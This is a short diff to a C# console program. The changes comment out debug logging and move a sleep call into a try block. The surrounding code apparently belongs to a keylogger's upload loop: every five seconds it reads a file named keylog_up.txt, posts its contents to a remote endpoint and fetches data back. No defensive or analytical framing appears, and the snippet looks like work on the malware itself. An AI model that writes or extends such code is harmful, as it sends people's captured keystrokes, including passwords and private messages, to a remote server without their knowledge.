@@ -44,13 +44,13 @@ namespace ConsoleApplication1
 		
 		while(true)
 		{
-		
-		StreamWriter sw = new StreamWriter(@path + @"\upload.txt", true);
-		sw.Write("Starting iteration\n");
-		int sleepfor = 5000;
-		Thread.Sleep(sleepfor);
 		try
 		{
+		//StreamWriter sw = new StreamWriter(@path + @"\upload.txt", true);
+		//sw.Write("Starting iteration\n");
+		int sleepfor = 5000;
+		Thread.Sleep(sleepfor);
+		
 		 
 		
 		
@@ -61,19 +61,19 @@ namespace ConsoleApplication1
 		string file_text=File.ReadAllText(@path + @"\keylog_up.txt",System.Text.Encoding.UTF8);
 		var res1=obj.PostRequestJson(updated_ep,file_text);
 
-                sw.Write(res1);
+                //sw.Write(res1);
 
                 
 	     	//Console.WriteLine(res1);
 		var res2=obj.getData(updated_ep);
-		 sw.Write(res1);
+		// sw.Write(res1);
 		//Console.WriteLine(res2);
-		sw.Close();
+		//sw.Close();
 		}
 		catch(Exception ex)
 		{
-			//Console.WriteLine("Exception : " +ex.Message);
-			sw.Write(ex.Message);
+			Console.WriteLine("Exception : " +ex.Message);
+			//sw.Write(ex.Message);
 		}
 		}
 	}
